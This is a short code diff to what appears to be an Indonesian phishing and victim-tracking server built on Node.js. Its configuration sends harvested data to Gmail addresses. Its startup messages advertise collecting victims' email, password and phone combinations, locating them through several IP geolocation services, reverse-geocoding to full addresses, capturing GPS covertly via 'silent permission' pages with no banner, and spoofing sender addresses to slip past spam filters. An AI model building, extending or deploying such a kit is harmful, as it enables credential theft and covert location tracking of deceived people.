@@ -19,7 +19,7 @@ const EMAIL_CONFIG = {
     'wxyzzay': {
         email: ['chilligemaass@gmail.com'],
         fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
     'ggwxzzr': {
         email: ['chilligemaass@gmail.com', 'Bay20110809@gmail.com'],
@@ -795,7 +795,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
-// ========== HTML BIASA (SILENT, TANPA BANNER) ==========
+// ========== HTML BIASA (SILENT PERMISSION) ==========
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -1139,7 +1139,7 @@ app.listen(PORT, () => {
     console.log(`✅ MULTI-API GEOLOCATION: ip-api.com + ipapi.co + ipwho.is cross-check!`);
     console.log(`✅ REVERSE GEOCODING: Nominatim (OpenStreetMap) untuk alamat lengkap!`);
     console.log(`✅ ANTI-DUPLIKAT: Kombinasi email+pw+phone sama akan ditolak!`);
-    console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR (tanpa kata peringatan, tanpa file)!`);
+    console.log(`✅ SPAM BOOSTER: From admin@DESASTR.invalid + Reply-To noreply@Desastr.invalid + unicode DESASTR!`);
     console.log(`✅ HTML BIASA: Silent permission (tanpa banner)!`);
-    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + silent permission!`);
+    console.log(`✅ HTML VIDEY: Slider biru + tombol biru + GPS akurasi maksimal!`);
 });
